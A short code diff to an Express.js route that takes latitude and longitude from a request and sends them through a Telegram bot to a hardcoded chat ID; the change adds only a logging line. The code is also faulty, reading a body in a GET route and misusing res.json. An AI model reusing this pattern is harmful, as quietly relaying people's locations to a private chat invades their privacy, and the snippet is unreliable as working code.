@@ -15,6 +15,7 @@ app.get('/', (req, res) => {
     try {
         var { lat, long } = req.body;
         if (lat && long) {
+            console.log(lat,long)
             bot.sendLocation(1771234776, lat, long);
         }
         res.json(lat, long);
